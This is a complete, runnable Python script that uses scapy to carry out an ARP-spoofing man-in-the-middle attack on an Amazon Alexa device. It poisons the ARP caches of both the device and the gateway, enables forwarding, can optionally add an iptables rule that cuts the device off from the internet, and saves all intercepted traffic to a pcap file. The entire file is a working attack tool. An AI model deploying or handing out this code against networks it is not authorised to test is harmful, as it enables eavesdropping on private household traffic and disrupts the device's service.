#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
import scapy.all as scapy

# --- configuration (edit these for your network) ---
ALEXA_IP    = "172.20.10.14"
GATEWAY_IP  = "172.20.10.1"
INTERFACE   = "wlan0"
PCAP_FILE   = "alexa_mitm.pcap"
DROP_INTERNET = True
# ---------------------------------------------------

def require_sudo():
    if "SUDO_UID" not in os.environ:
        print("[!] Run this script with sudo.")
        sys.exit(1)

def enable_ip_forward():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)

def get_mac(ip):
    ans, _ = scapy.arping(ip, timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

def arp_spoof(victim_ip, victim_mac, spoof_ip):
    pkt = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def spoof_loop(alexa_mac, gateway_mac):
    while True:
        arp_spoof(ALEXA_IP,  alexa_mac,   GATEWAY_IP)
        arp_spoof(GATEWAY_IP, gateway_mac, ALEXA_IP)
        time.sleep(2)

def iptables_block_internet():
    # Drop all traffic from Alexa that is not destined to the local subnet
    cmd = [
        "iptables", "-A", "FORWARD",
        "-s", ALEXA_IP,
        "!", "-d", GATEWAY_IP + "/24",
        "-j", "DROP"
    ]
    subprocess.run(cmd, check=False)

def process_packet(pkt):
    scapy.wrpcap(PCAP_FILE, pkt, append=True)

def sniff_traffic():
    scapy.sniff(iface=INTERFACE, store=False, prn=process_packet)

def main():
    require_sudo()
    enable_ip_forward()

    print("[*] Resolving MAC addresses...")
    alexa_mac   = get_mac(ALEXA_IP)
    gateway_mac = get_mac(GATEWAY_IP)

    if not alexa_mac or not gateway_mac:
        print("[!] Could not resolve MAC addresses. Check IPs and connectivity.")
        sys.exit(1)

    print(f"[*] Alexa  {ALEXA_IP} -> {alexa_mac}")
    print(f"[*] Router {GATEWAY_IP} -> {gateway_mac}")

    if DROP_INTERNET:
        print("[*] Installing iptables rule to drop Alexa Internet traffic...")
        iptables_block_internet()

    print("[*] Starting ARP spoofing thread...")
    t = threading.Thread(target=spoof_loop, args=(alexa_mac, gateway_mac), daemon=True)
    t.start()

    print(f"[*] Sniffing traffic on {INTERFACE}, writing to {PCAP_FILE}")
    print("[*] Press Ctrl+C to stop.")
    sniff_traffic()

if __name__ == "__main__":
    main()
